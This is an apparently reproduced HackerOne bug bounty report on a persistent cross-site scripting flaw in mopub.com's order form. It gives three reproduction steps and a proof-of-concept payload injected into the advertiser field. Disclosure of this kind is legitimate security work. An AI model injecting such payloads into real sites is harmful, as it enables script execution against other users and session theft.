# HackerOne Report: XSS ON MOPUB.COM
**Report ID:** 15356
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
PERSITENT XSS ON MOPUB.COM
STEPS TO REPRODUCE:
1. go to order
2. type in the advertiser "><img src=x onerror=prompt(document.domain)> and then press tab
3. PAYLOAD RUNS.



## Discussion & Remediation Timeline
